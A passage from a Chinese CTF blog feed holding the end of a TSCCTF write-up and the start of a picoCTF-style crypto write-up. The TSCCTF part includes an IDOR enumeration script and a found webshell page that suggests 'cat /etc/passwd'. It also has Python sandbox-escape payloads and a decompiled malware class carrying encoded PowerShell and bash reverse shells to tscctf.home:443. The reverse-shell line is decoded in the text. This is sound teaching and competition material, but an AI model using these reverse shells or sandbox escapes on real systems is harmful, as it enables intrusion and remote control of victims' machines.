10000~20000的所有檔案，如果回傳結果不是 <code>This is a normal file with ID:</code>或 <code>File not found</code> 為開頭就列出來</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定義 URL 和檔案 ID 範圍</span></span><br><span class="line">base_url = <span class="string">"http://172.31.0.2:8057/download.php"</span></span><br><span class="line">start_id = <span class="number">10000</span></span><br><span class="line">end_id = <span class="number">20000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 記錄非預期回應</span></span><br><span class="line">unexpected_responses = {}</span><br><span class="line"></span><br><span class="line"><span class="comment"># 開始嘗試下載</span></span><br><span class="line"><span class="keyword">for</span> file_id <span class="keyword">in</span> <span class="built_in">range</span>(start_id, end_id + <span class="number">1</span>):</span><br><span class="line">    params = {<span class="string">"file_id"</span>: file_id}</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(base_url, params=params)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            content = response.text</span><br><span class="line">            <span class="comment"># 過濾預期內容</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (content.startswith(<span class="string">"This is a normal file with ID:"</span>) <span class="keyword">or</span> <span class="string">"File not found"</span> <span class="keyword">in</span> content):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"[<span class="subst">{file_id}</span>] 非預期內容"</span>)</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line">                unexpected_responses[file_id] = content</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[<span class="subst">{file_id}</span>] 請求失敗: <span class="subst">{e}</span>"</span>)</span><br></pre></td></tr></tbody></table></figure><p>發現了可能最怪的東東是</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[12001] 非預期內容</span><br><span class="line">        &lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;title&gt;System Command Interface&lt;/title&gt;</span><br><span class="line">            &lt;style&gt;</span><br><span class="line">                body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }</span><br><span class="line">                pre { background: #2d2d2d; padding: 10px; border-radius: 5px; }</span><br><span class="line">                .output { margin-top: 10px; }</span><br><span class="line">            &lt;/style&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;h2&gt;System Command Interface&lt;/h2&gt;</span><br><span class="line">            &lt;form method="GET"&gt;</span><br><span class="line">                &lt;input type="hidden" name="file_id" value="12001"&gt;</span><br><span class="line">                Command: &lt;input type="text" name="cmd" style="width: 300px;" value=""&gt;</span><br><span class="line">                &lt;input type="submit" value="Execute"&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div class="output"&gt;</span><br><span class="line">                &lt;pre&gt;Try some commands:</span><br><span class="line">ls -la</span><br><span class="line">pwd</span><br><span class="line">cat /etc/passwd&lt;/pre&gt;            &lt;/div&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p>於是我就到<code>http://172.31.0.2:8057/download.php?file_id=12001</code>發現好像是個 WebShell ，然後隨便找找就發現 flag 了 /</p><figure><img data-src="https://hackmd.io/_uploads/B1D5lwGDyg.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag:<code>TSC{You_can_be_ID0R_12353oujhefrgiuoewihoqweihfo}</code></p><h2 id="misc">Misc <a href="#misc" class="headerlink"></a></h2><h3 id="subdomain-hijacking">Subdomain Hijacking <a href="#subdomain-hijacking" class="headerlink"></a></h3><p>就隨便亂生成一些 subdomain，發現好像只有開頭字母會引響生成的結果，所以就從 a 試到 z 看看，試到 t的時候發現他變大寫了？ 趕快拿去試試，就發現得到 flag 了</p><figure><img data-src="https://hackmd.io/_uploads/B1jFoyXv1x.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img data-src="https://hackmd.io/_uploads/ByD9s1Xwyl.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag:<code>TSC{hijacking_success_f5a0651d788f466ba0e5e707ebf00f4d}</code></p><h3 id="babyjail">BabyJail <a href="#babyjail" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">'&gt; '</span>), {<span class="string">"__builtins__"</span>: {}}, {}))</span><br></pre></td></tr></tbody></table></figure><p><code>{"__builtins__": {}}</code>會移除所有內建函數，試著從能執行系統命令的類別下手，利用<code>''.__class__.__base__.__subclasses__()</code> 發現有個<code>&lt;class 'os._wrap_close'&gt;</code> 能利用一下，就搓出了以下的payload 成功得到 flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 172.31.3.2 8002</span><br><span class="line">&gt; ''.__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('cat flag*')</span><br><span class="line">TSC{just_a_classic_nobuiltins_pyjail_for_baby}</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{just_a_classic_nobuiltins_pyjail_for_baby}</code></p><h3 id="calc">calc <a href="#calc" class="headerlink"></a></h3><p>參考了 <a href="https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass">PyjailCheatSheet 的 Unicode Bypass</a> 自己修改蠻久一下，就成功造出一個 shell了</p><p>payload:<code>(𝘥:=()._＿𝘥𝘰𝘤＿_,𝘥:=()._＿𝘥𝘪𝘳＿_().__𝘤𝘭𝘢𝘴𝘴__(𝘥),𝘴:=𝘥.𝘱𝘰𝘱(19),𝘥._＿𝘤𝘭𝘢𝘴𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_).𝘱𝘰𝘱(1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().𝘱𝘰𝘱(121).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.𝘱𝘰𝘱(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.𝘱𝘰𝘱(54)))</code></p><p>P.S. 不知道為什麼這坨如果一次複製直接貼上有些字會變成 (U + FFFD)，但如果分批複製就不會 w</p><p>flag:<code>TSC{PEP-3131_is_a_friendly_PEP_for_pyjai1er_nhsdcuhq6}</code></p><h2 id="補題區">補題區 <a href="#補題區" class="headerlink"></a></h2><h3 id="misc---a-minecraft-soc-mission">Misc - A Minecraft SOC Mission<a href="#misc---a-minecraft-soc-mission" class="headerlink"></a></h3><p>這題其實賽中就有做出來了，但 flag 格式搞錯了 啊啊啊啊啊，與 388分失之交臂</p><p>把下載的 <code>Evil.class</code> 拿去反編譯 (可以用<a href="https://decompiler.com/">這個</a>)，就會得到</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> {</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] $ = <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"QTlXNHY2eXVpPQ=="</span>, <span class="string">"WVcxdmJtY3NJR0Z1WkNCemJ5QnBjeUJwZENCbGVHVmpkWFJwYm1jPQ=="</span>, <span class="string">"ZEhOalpYUm1MbWh2YldVPQ=="</span>};</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> String ᅟ = <span class="string">"k9"</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> ㅤ = <span class="number">1017</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> ᅠ(<span class="type">byte</span>[] var1) {</span><br><span class="line">      <span class="keyword">try</span> {</span><br><span class="line">         String[] var2 = (<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode($[<span class="number">1</span>]))).split(<span class="string">","</span>);</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode($[<span class="number">2</span>]));</span><br><span class="line">         <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> (String)Class.forName(<span class="string">"java.lang.System"</span>).getMethod(<span class="string">"getProperty"</span>, String.class).invoke((Object)<span class="literal">null</span>, var2[<span class="number">0</span>]);</span><br><span class="line">         <span class="type">boolean</span> <span class="variable">var5</span> <span class="operator">=</span> var4.toLowerCase().contains(var2[<span class="number">1</span>]);</span><br><span class="line">         String[] var10000;</span><br><span class="line">         <span class="keyword">if</span> (var5) {</span><br><span class="line">            var10000 = <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="literal">null</span>};</span><br><span class="line">            <span class="type">String</span> <span class="variable">var10003</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]{<span class="number">112</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">101</span>, <span class="number">32</span>});</span><br><span class="line">            var10000[<span class="number">2</span>] = var10003 + <span class="string">"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAdABzAGMAYwB0AGYALgBoAG8AbQBlACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"</span>;</span><br><span class="line">         } <span class="keyword">else</span> {</span><br><span class="line">            var10000 = <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="built_in">this</span>.ㅤㅤ(<span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"echo"</span>, <span class="string">"YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ=="</span>, <span class="string">"base64"</span>, <span class="string">"-d"</span>, <span class="string">"bash"</span>})};</span><br><span class="line">         }</span><br><span class="line"></span><br><span class="line">         String[] var6 = var10000;</span><br><span class="line">         Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>, String[].class).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke((Object)<span class="literal">null</span>), var6);</span><br><span class="line">      } <span class="keyword">catch</span> (Exception var7) {</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> String ㅤㅤ(String[] var1) {</span><br><span class="line">      <span class="type">StringBuilder</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var1.length; ++var3) {</span><br><span class="line">         var2.append(var1[var3]);</span><br><span class="line">         <span class="keyword">if</span> (var3 &lt; var1.length - <span class="number">1</span>) {</span><br><span class="line">            var2.append(<span class="string">" | "</span>);</span><br><span class="line">         }</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> var2.toString();</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> {</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">Evil</span>()).ᅠ(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>]);</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>把一些看起來像 base64 過的東西解密後就知道他是一個執行 reverse shell的程式<code>bash -i &gt;&amp; /dev/tcp/tscctf.home/443 0&gt;&amp;1</code>，然後要交的東西就是 <code>tscctf.home</code> 了，原本還在想要怎麼找到ip 還用 <code>tscctf{}</code> 包起來，沒想到這麼簡單嗚嗚</p><p>flag: <code>tscctf.home</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在 Qualified Scoreboard 第五，全部人的第 41，嗚嗚被虐爛了&lt;/p&gt;
&lt;figure&gt;
&lt;img data-src=&quot;https://i.imgur.com/IGyLku7.png&quot; alt=&quot;Qualified Scoreboard&quot;&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;Qualified Scoreboard&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure&gt;
&lt;img data-src=&quot;https://i.imgur.com/bImlzwR.png&quot; alt=&quot;Overall Scoreboard&quot;&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;Overall Scoreboard&lt;/figcaption&gt;
&lt;/figure&gt;</summary>
    
    
    
    <category term="資安" scheme="https://moon-jam.me/categories/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/categories/%E8%B3%87%E5%AE%89/CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="TSCCTF" scheme="https://moon-jam.me/tags/TSCCTF/"/>
    
    <category term="Writeup" scheme="https://moon-jam.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day30</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day30/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day30/</id>
    <published>2024-10-02T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>三十天了！ 今天就寫六題 Crypto 的 Writeup ，最後再來個小小總結</p><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="第一題rsa_oracle">第一題：rsa_oracle <a href="#第一題rsa_oracle" class="headerlink"></a></h3><p>這題要利用 RSA 模運算中乘的性質解出這題</p><p><span class="math display">\[c = m^e \mod n\]</span><br><span class="math display">\[m = c^d \mod n\]</span><br><span class="math display">\[(a \cdot b) \mod n = ((a \mod n) \cdot (b\mod n)) \mod n\]</span><br><span class="math display">\[m_1*m_2 = (c_1^d \mod n) \cdot (c_2^d \modn) = (c_1^d \cdot c_2^d) \mod n = (c_1 \cdot c_2)^d \mod n\]</span></p><p>我們可將 <span class="math inline">\(c_1\)</span>設為題目給的密碼，<span class="math inline">\(c_2\)</span>自己設一個數字，就能藉由 <span class="math inline">\(c_2\)</span> 和<span class="math inline">\(c_1*c_2\)</span> 的解密結果，推出 <span class="math inline">\(c_1\)</span>的明文，也就是用來解密用的密碼，再根據提示利用 openssl 解出 flag。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: io = remote(<span class="string">"titan.picoctf.net"</span>, <span class="number">59764</span>)</span><br><span class="line">[x] Opening connection to titan.picoctf.net on port <span class="number">59764</span></span><br><span class="line">[x] Opening connection to titan.picoctf.net on port <span class="number">59764</span>: Trying <span class="number">3.139</span><span class="number">.174</span><span class="number">.234</span></span><br><span class="line">[+] Opening connection to titan.picoctf.net on port <span class="number">59764</span>: Done</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: io.sendline(<span class="string">b"E"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: io.sendline(<span class="string">b"\x02"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: io.recv()</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">b'*****************************************\n****************THE ORACLE***************\n*****************************************\nwhat should we do for you? \nE --&gt; encrypt D --&gt; decrypt. \nenter text to encrypt (encoded length must be less than keysize): \x02\n\nencoded cleartext as Hex m: 2\n\nciphertext (m ^ e mod n) 5067313465613043651275429665315895824157755779222372979446076012356324498190828210335763979330272318657269048435311897896433721115606764442199497891219230\n\nwhat should we do for you? \nE --&gt; encrypt D --&gt; decrypt. \n'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: c2 = <span class="number">5067313465613043651275429665315895824157755779222372979446076012356324498190828210335763979330272318657</span></span><br><span class="line">   ...: <span class="number">269048435311897896433721115606764442199497891219230</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: c = <span class="number">17650370497640477243481146344736587348304908520660613456869163656586181949810972167509294217348129116804</span></span><br><span class="line">   ...: <span class="number">34647401939068526285652985802740837961814227312100</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: io.sendline(<span class="string">b"D"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: io.sendline(<span class="built_in">str</span>(c2*c).encode())</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: io.recv()</span><br><span class="line">Out[<span class="number">11</span>]: <span class="string">b'Enter text to decrypt: decrypted ciphertext as hex (c ^ d mod n): 707062c872\ndecrypted ciphertext: ppb\xc3\x88r\n\nwhat should we do for you? \nE --&gt; encrypt D --&gt; decrypt. \n'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: password = <span class="built_in">int</span>(<span class="string">"707062c872"</span>, <span class="number">16</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: long_to_bytes(password).decode()</span><br><span class="line">Out[<span class="number">13</span>]: <span class="string">'881d9'</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">openssl enc -aes-256-cbc -d -<span class="keyword">in</span> secret.enc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enter AES-256-CBC decryption password:</span><br><span class="line">*** WARNING : deprecated key derivation used.</span><br><span class="line">Using -iter or -pbkdf2 would be better.</span><br><span class="line">picoCTF{su......b6}</span><br></pre></td></tr></tbody></table></figure><h3 id="第二題custom-encryption">第二題：Custom encryption <a href="#第二題custom-encryption" class="headerlink"></a></h3><p>按照題目給的 script 一步步倒推回去就可以得到答案了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">a = <span class="number">95</span></span><br><span class="line">b = <span class="number">21</span></span><br><span class="line">sharded_key = gcd(<span class="number">237915</span>, <span class="number">1850450</span>, <span class="number">1850450</span>, <span class="number">158610</span>, <span class="number">2458455</span>, <span class="number">2273410</span>, <span class="number">1744710</span>, <span class="number">1744710</span>, <span class="number">1797580</span>, <span class="number">1110270</span>, <span class="number">0</span>, <span class="number">2194105</span>, <span class="number">555135</span>, <span class="number">132175</span>, <span class="number">1797580</span>, <span class="number">0</span>, <span class="number">581570</span>, <span class="number">2273410</span>, <span class="number">26435</span>, <span class="number">1638970</span>, <span class="number">634440</span>, <span class="number">713745</span>, <span class="number">158610</span>, <span class="number">158610</span>, <span class="number">449395</span>, <span class="number">158610</span>, <span class="number">687310</span>, <span class="number">1348185</span>, <span class="number">845920</span>, <span class="number">1295315</span>, <span class="number">687310</span>, <span class="number">185045</span>, <span class="number">317220</span>, <span class="number">449395</span>) // <span class="number">311</span></span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">237915</span>, <span class="number">1850450</span>, <span class="number">1850450</span>, <span class="number">158610</span>, <span class="number">2458455</span>, <span class="number">2273410</span>, <span class="number">1744710</span>, <span class="number">1744710</span>, <span class="number">1797580</span>, <span class="number">1110270</span>, <span class="number">0</span>, <span class="number">2194105</span>, <span class="number">555135</span>, <span class="number">132175</span>, <span class="number">1797580</span>, <span class="number">0</span>, <span class="number">581570</span>, <span class="number">2273410</span>, <span class="number">26435</span>, <span class="number">1638970</span>, <span class="number">634440</span>, <span class="number">713745</span>, <span class="number">158610</span>, <span class="number">158610</span>, <span class="number">449395</span>, <span class="number">158610</span>, <span class="number">687310</span>, <span class="number">1348185</span>, <span class="number">845920</span>, <span class="number">1295315</span>, <span class="number">687310</span>, <span class="number">185045</span>, <span class="number">317220</span>, <span class="number">449395</span>]</span><br><span class="line"></span><br><span class="line">semi_cipher = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> cipher:</span><br><span class="line">    semi_cipher += (<span class="built_in">chr</span>(char//sharded_key//<span class="number">311</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamic_xor_decrypt</span>(<span class="params">cipher_text, text_key</span>):</span><br><span class="line">    rev_ans = <span class="string">""</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(text_key)</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher_text):</span><br><span class="line">        key_char = text_key[i % key_length]</span><br><span class="line">        encrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="built_in">ord</span>(key_char))</span><br><span class="line">        rev_ans += encrypted_char</span><br><span class="line">    <span class="keyword">return</span> rev_ans[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">plain_text = dynamic_xor_decrypt(semi_cipher, <span class="string">"trudeau"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br></pre></td></tr></tbody></table></figure><h3 id="第三題c3">第三題：C3 <a href="#第三題c3" class="headerlink"></a></h3><p>一樣按照編碼器構造出解碼器</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lookup1 = <span class="string">"\n \"#()*+/1:=[]abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">lookup2 = <span class="string">"ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst"</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">"DLSeGAGDgBNJDQJDCFSFnRBIDjgHoDFCFtHDgJpiHtGDmMAQFnRBJKkBAsTMrsPSDDnEFCFtIbEDtDCIbFCFtHTJDKerFldbFObFCFtLBFkBAAAPFnRBJGEkerFlcPgKkImHnIlATJDKbTbFOkdNnsgbnJRMFnRBNAFkBAAAbrcbTKAkOgFpOgFpOpkBAAAAAAAiClFGIPFnRBaKliCgClFGtIBAAAAAAAOgGEkImHnIl"</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">prev = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> cipher:</span><br><span class="line">    cur = (lookup2.index(char) + prev) % <span class="number">40</span></span><br><span class="line">    ans += lookup1[cur]</span><br><span class="line">    prev = cur</span><br><span class="line"></span><br><span class="line"><span 